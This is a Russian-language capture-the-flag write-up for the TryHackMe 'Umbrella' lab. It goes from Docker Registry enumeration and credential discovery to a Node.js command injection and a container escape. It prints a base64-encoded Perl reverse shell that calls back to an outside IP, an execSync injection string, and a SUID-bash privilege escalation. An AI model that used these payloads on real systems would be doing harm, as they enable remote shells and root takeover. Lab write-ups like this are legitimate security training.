https://tryhackme.com/room/umbrella
### Разведка
nmap -sC -sV
- Стандартные скрипты
- сканирование версий


- 22 -ssh
- 3306 - mysql
- 5000 - докер
- 8080 - веб приложуха на node.js 

![[Pasted image 20251228210238.png]]

Пробую перебрать директории, мб что то интересное будет
![[Pasted image 20251228210418.png]]

Короче я потыкал еще разные варианты, SQLi на 8080 (Раз уж у нас есть 3306 с mysql то скорее всего и БД и запросы к ней это SQL)

Видимо надо че то делать по докеру на 5000 порту, а точнее как показал nmap **Docker Registry (API: 2.0)**. 
Я нашел вот такую темку:
https://book.hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html
Отсюда можно понять какие эндпоинты существуют у **Docker Registry (API: 2.0)**
	Делаем дальше

![[Pasted image 20251228211503.png]]
Есть пробитие!
Этот запрос - стандартный эндпоинт для докер регистри к нему мы и обратились. Теперь мы знаем какой репозиторий тут лежит

![[Pasted image 20251228213132.png]]
Отлично. Мы зашли в манифест со слоями. 

![[Pasted image 20251228213147.png]]
Нашел пасс от ДБ, сами ищите где он тут. 

### Эксплуатация

С небольшой суетой через старую версию mysql зашел все таки в ДБ с этим паролем и первый пункт выполнен.
![[Pasted image 20251228213230.png]]
![[Pasted image 20251228213316.png]]
Нашел че то на 4 пользователей. думаю теперь можно залогиниться через ту панель входа с 8080 порта.
![[Pasted image 20251228214504.png]]

Под первыми кредами захожу куда-то. кстати пароль в md5 Хэширован, через

![[Pasted image 20251228214811.png]]
Оказалось что те же креды подходят по ssh. На 8080 пока ничего не делаем

### User
![[Pasted image 20251228214858.png]]
Легчайший юзер 

### Root

![[Pasted image 20251229144606.png]]
Дальше лазаю по файлам, нашел докер компос

И тут уже начинается жесткая дрочь с докером о котором я ничего не знаю, придется почитать что-то уже и понять что к чему. 

Я почитал про слои докера и про так называемые **digest** теперь все стало понятно. нам нужно вытянуть архив самого приложения. я нашел все по той же ссылке как взять слой необходимый, что бы наше приложение стянуть к себе на пк, через curl.
![[Pasted image 20251229145640.png]]

ЕСТЬ! соси докер!

![[Pasted image 20251229145923.png]]
и вот в архиве нашел js код. изучаем. чувствую рут уже близко. Все, теперь мы полностью знаем как работает приложуха на 8080 порту.

#### Иньекция в node.js 
Напоминаю, что из сканирования портов мы узнали, что на 8080 запущен node.js

https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

Смотрим вообще что мы отсюда можем вытянуть.

Тут чистейшей воды иньекция в node.js

Вот сама иньекция. И что бы ее передать и пройти фильтры перекодируем ее в base64
`perl -e 'use Socket;$i="192.168.180.184";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`

Перекодили и в эхо.

`require('child_process').execSync('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xODAuMTg0IjskcD00NDQ1O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vYmFzaCAtaSIpO307Jw= | base64 -d | bash')`

![[Pasted image 20251229153312.png]]
Отправляем в форму на 8080. открываем порт и получаем шелл. 
![[Pasted image 20251229153353.png]]

Но это еще не все. Данный шел не дает нам всех прав рут пользователя, это рут только в образе докер-контейнера, а не на всей машине. надо выйти из контейнера и стать рут на хосте. 

Как это сделать? 

Суть в том что тут есть мисконфигурация которая позволяет нам внутри контейнера монтирвоать файлы и отправлять их на хост. папка /logs с докер шелла и /logs с ssh одна и та же, вернее даже сказать что /logs НЕ внутренняя папка контейнера, а директория хоста

logs с root
![[Pasted image 20251229182435.png]]

logs c claire-r в директории timeTracker
![[Pasted image 20251229183233.png]]
Создадим там /bin/bash - файл, при запуске которого пользователь получит root права. Теперь если с рут из докера выдать ему права на рут и дать выполнение юзером, то юзер получит рут.


![[Pasted image 20251229182502.png]]
Выдали привилегии файлу

`chown root:root bash`
меняем владельца файла на root 

`chmod 4777 bash` 
4 - SUID
777 - все права

Теперт если любой пользователь запустит файл - он станет рутом, тк файл запускается с правами владельца файла, файлом владеет root. 

Выполняем файл и получаем привелегии рут пользователя
![[Pasted image 20251229183437.png]]
И получили наш рут флаг)

Мы запустили файл с флагом -p  это означает отсутствие сброса привилегий после выполнение скрипта(как я понимаю)



P.s. Это мой первый райтап, не судите строго
